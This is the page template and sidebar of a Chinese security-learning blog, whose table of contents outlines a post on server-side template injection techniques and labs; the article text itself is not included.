id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/Sherlock.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" ait="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这里是我<b style="color:#fff">记录学习</b>收获的个人博客，<b style="color:#fff">也希望</b>能和大家一起<b style="color:#fff">进步</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">愿你可以在这里找到对你有<b style="color:#fff">帮助</b>的<b style="color:#fff">文章</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">Sherlock</h1><div class="author-info__desc">言念君子，温其如玉</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/cina666" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>Announcement</span></div><div class="announcement_content">欢迎来看我的博客鸭~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">1.</span> <span class="toc-text">常用魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#class"><span class="toc-number">1.1.</span> <span class="toc-text">__class__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%BA%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text">获取基类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#subclasses"><span class="toc-number">1.3.</span> <span class="toc-text">__subclasses__()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#builtins"><span class="toc-number">1.4.</span> <span class="toc-text">__builtins__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#globals"><span class="toc-number">1.5.</span> <span class="toc-text">__globals__</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-SSTI-%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">2.</span> <span class="toc-text">利用 SSTI 读取文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-2"><span class="toc-number">2.1.</span> <span class="toc-text">Python 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-3"><span class="toc-number">2.2.</span> <span class="toc-text">Python 3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-SSTI-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">3.</span> <span class="toc-text">利用 SSTI 执行命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0-eval-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">3.1.</span> <span class="toc-text">寻找内建函数 eval 执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE-os-%E6%A8%A1%E5%9D%97%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">3.2.</span> <span class="toc-text">寻找 os 模块执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE-popen-%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">3.3.</span> <span class="toc-text">寻找 popen 函数执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE-importlib-%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">3.4.</span> <span class="toc-text">寻找 importlib 类执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE-linecache-%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">3.5.</span> <span class="toc-text">寻找 linecache 函数执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE-subprocess-Popen-%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">3.6.</span> <span class="toc-text">寻找 subprocess.Popen 类执行命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">关键字绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="toc-number">4.1.</span> <span class="toc-text">利用字符串拼接绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">4.2.</span> <span class="toc-text">利用编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Unicode%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97%EF%BC%88flask%E9%80%82%E7%94%A8%EF%BC%89"><span class="toc-number">4.3.</span> <span class="toc-text">利用Unicode编码绕过关键字（flask适用）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Hex%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">4.4.</span> <span class="toc-text">利用Hex编码绕过关键字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">4.5.</span> <span class="toc-text">利用引号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8join-%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">4.6.</span> <span class="toc-text">利用join()函数绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%85%B6%E4%BB%96%E5%AD%97%E7%AC%A6"><span class="toc-number">5.</span> <span class="toc-text">绕过其他字符</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E4%B8%AD%E6%8B%AC%E5%8F%B7"><span class="toc-number">5.1.</span> <span class="toc-text">过滤了中括号[ ]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E5%BC%95%E5%8F%B7"><span class="toc-number">5.2.</span> <span class="toc-text">过滤了引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E4%B8%8B%E5%88%92%E7%BA%BF"><span class="toc-number">5.3.</span> <span class="toc-text">过滤了下划线__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E7%82%B9"><span class="toc-number">5.4.</span> <span class="toc-text">过滤了点 .</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E5%A4%A7%E6%8B%AC%E5%8F%B7"><span class="toc-number">5.5.</span> <span class="toc-text">过滤了大括号</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-attr-%E6%9D%A5Bypass"><span class="toc-number">6.</span> <span class="toc-text">利用 |attr() 来Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8C%E6%97%B6%E8%BF%87%E6%BB%A4%E4%BA%86-%E5%92%8C"><span class="toc-number">6.1.</span> <span class="toc-text">同时过滤了 . 和 []</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8C%E6%97%B6%E8%BF%87%E6%BB%A4%E4%BA%86-%E3%80%81%E7%82%B9-%E5%92%8C"><span class="toc-number">6.2.</span> <span class="toc-text">同时过滤了 __ 、点. 和 []</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8C%E6%97%B6%E8%BF%87%E6%BB%A4%E4%BA%86-%E3%80%81%E7%82%B9-%E5%92%8C-1"><span class="toc-number">6.3.</span> <span class="toc-text">同时过滤了 __ 、点. 和 []</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8Unicode%E7%BC%96%E7%A0%81%E9%85%8D%E5%90%88-attr-%E8%BF%9B%E8%A1%8CBypass"><span class="toc-number">6.4.</span> <span class="toc-text">用Unicode编码配合 |attr() 进行Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2020-DASCTF-%E5%85%AB%E6%9C%88%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-ezflask"><span class="toc-number">6.5.</span> <span class="toc-text">[2020 DASCTF 八月安恒月赛]ezflask</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86request%E5%92%8Cclass"><span class="toc-number">7.</span> <span class="toc-text">过滤了request和class</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NCTF2018-flask%E7%9C%9F%E9%A6%99"><span class="toc-number">7.1.</span> <span class="toc-text">[NCTF2018]flask真香</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BP-Lab-Basic-server-side-template-injection-ERB%E6%A8%A1%E6%9D%BF"><span class="toc-number">8.</span> <span class="toc-text">BP-Lab: Basic server-side template injection(ERB模板)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BP-Lab-Basic-server-side-template-injection-code-context-Tornado%E6%A8%A1%E6%9D%BF"><span class="toc-number">9.</span> <span class="toc-text">BP-Lab: Basic server-side template injection(code context)(Tornado模板)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BP-Lab-Basic-server-side-template-injection-using-documentation-Freemarker%E6%A8%A1%E6%9D%BF"><span class="toc-number">10.</span> <span class="toc-text">BP-Lab: Basic server-side template injection using documentation(Freemarker模板)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab-Server-side-template-injection-in-an-unknown-language-with-a-documented-exploit"><span class="toc-number">11.</span> <span class="toc-text">Lab: Server-side template injection in an unknown language with a documented exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%8C%E9%80%9A%E8%BF%87%E7%94%A8%E6%88%B7%E6%8F%90%E4%BE%9B%E7%9A%84%E5%AF%B9%E8%B1%A1%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%8A%AB%E9%9C%B2"><span class="toc-number">12.</span> <span class="toc-text">Lab: 服务器端模板注入，通过用户提供的对象进行信息披露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lab%EF%BC%9A%E6%B2%99%E7%9B%92%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">13.</span> <span class="toc-text">Lab：沙盒环境中的服务器端模板注入</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/15/JavaDeserializeLabs/" title="JavaDeserializeLabs">JavaDeserializeLabs</a><time datetime="2024-11-15T07:36:32.000Z" title="Created 2024-11-15 15:36:32">2024-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/06/JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/" title="JDK动态代理">JDK动态代理</a><time datetime="2024-11-06T04:04:04.000Z" title="Created 2024-11-06 12:04:04">2024-11-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/24/java%E7%B1%BB%E5%8A%A0%E8%BD%BD/" title="java类加载">java类加载</a><time datetime="2024-10-24T12:43:23.000Z" title="Created 2024-10-24 20:43:23">2024-10-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections/" title="java反序列化CommonsCollections">java反序列化CommonsCollections</a><time datetime="2024-10-24T12:00:05.000Z" title="Created 2024-10-24 20:00:05">2024-10-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/18/Java%E5%BA%8F%E5%88%97%E5%8C%96%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A5%E5%8F%8A%E5%8F%8D%E5%B0%84/" title="Java序列化、反序列化以及反射">Java序列化、反序列化以及反射</a><time datetime="2024-10-18T11:53:21.000Z" title="Created 2024-10-18 19:53:21">2024-10-18</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="workboard"><img class="workSituationImg boardsign" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.0.4/img/badge/安知鱼-上班摸鱼中.svg" alt="距离月入25k也就还差一个大佬带我~" title="距离月入25k也就还差一个大佬带我~"/><div id="runtimeTextTip"></div></div></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2023 - 2024 By <a class="footer-bar-link" href="/" title="Sherlock" target="_blank">Sherlock</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">Articles</div><div class="length-num">47</div></a><a href="/tags/" title="tag"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/" title="category"><div class="headline">Categories</div><div class="length-num">7</div></a></div><span class="sidebar-menu-item-title">Function</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="Display Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>Display Mode</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/link/"><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/essay/"><span> 闲言碎语</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/cors/" style="font-size: 0.88rem;">cors<sup>1</sup></a><a href="/tags/csrf/" style="font-size: 0.88rem;">csrf<sup>1</sup></a><a href="/tags/php/" style="font-size: 0.88rem;">php<sup>5</sup></a><a href="/tags/python/" style="font-size: 0.88rem;">python<sup>3</sup></a><a href="/tags/sql/" style="font-size: 0.88rem;">sql<sup>3</sup></a><a href="/tags/ssrf/" style="font-size: 0.88rem;">ssrf<sup>1</sup></a><a href="/tags/ssti/" style="font-size: 0.88rem;">ssti<sup>2</sup></a><a href="/tags/web/" style="font-size: 0.88rem;">web<sup>3</sup></a><a href="/tags/xss/" style="font-size: 0.88rem;">xss<sup>1</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 0.88rem;">前端<sup>2</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div id="he-plugin-simple"></div><script>var WIDGET = {
  "CONFIG": {
    "modules": "0124",
    "background": "2",
    "tmpColor": "FFFFFF",
    "tmpSize": "16",
    "cityColor": "FFFFFF",
    "citySize": "16",
    "aqiColor": "E8D87B",
    "aqiSize": "16",
    "weatherIconSize": "24",
    "alertIconSize": "18",
    "padding": "10px 10px 10px 10px",
    "shadow": "0",
    "language": "auto",
    "borderRadius": "20",
    "fixed": "true",
    "vertical": "top",
    "horizontal": "left",
    "left": "20",
    "top": "7.1",
    "key": "df245676fb434a0691ead1c63341cd94"
  }
}
</script><link rel="stylesheet" href="https://widget.qweather.net/simple/static/css/he-simple.css?v=1.4.0"/><script src="https://widget.qweather.net/simple/static/js/he-simple.js?v=1.4.0"></script><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.4/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("10/04/2023 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2023 By 安知鱼 V1.6.8",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 Sherlock 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script async="async">(function () {
  var grt = new Date("10/04/2023 00:00:00"); //设置网站上线时间
  var now = new Date();
  var dnum;
  var hnum;
  var mnum;
  var snum;
  var nowHour;

  // 计算并更新天数、小时数、分钟数和秒数
  function updateTime() {
    now = new Date(); // 更新 now 的值
    nowHour = now.getHours(); // 更新 nowHour 的值
    var days = (now - grt) / 1000 / 60 / 60 / 24;
    dnum = Math.floor(days);
    var hours = (now - grt) / 1000 / 60 / 60 - 24 * dnum;
    hnum = Math.floor(hours);
    if (String(hnum).length == 1) {
      hnum = "0" + hnum;
    }
    var minutes = (now - grt) / 1000 / 60 - 24 * 60 * dnum - 60 * hnum;
    mnum = Math.floor(minutes);
    if (String(mnum).length == 1) {
      mnum = "0" + mnum;
    }
    var seconds = (now - grt) / 1000 - 24 * 60 * 60 * dnum - 60 * 60 * hnum - 60 * mnum;
    snum = Math.round(seconds);
    if (String(snum).length == 1) {
      snum = "0" + snum;
    }
  }

  // 更新网页中显示的网站运行时间
  function updateHtml() {
    const footer = document.getElementById("footer");
    if (!footer) return
    let currentTimeHtml = "";
    if (nowHour < 18 && nowHour >= 9) {
